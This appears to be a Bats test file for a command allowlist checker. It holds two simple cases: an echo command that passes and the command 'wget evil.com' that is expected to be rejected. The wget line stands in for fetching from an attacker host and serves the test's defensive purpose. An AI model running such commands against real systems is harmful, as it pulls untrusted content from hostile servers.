# Simple cases {{{
@test "allowed" {
  run command-in-list "echo 'hello world" -- "echo"
  [ $status -eq 0 ]
}

@test "not allowed" {
  run command-in-list "wget evil.com" -- "echo"
  [ $status -eq 1 ]
}
# }}}
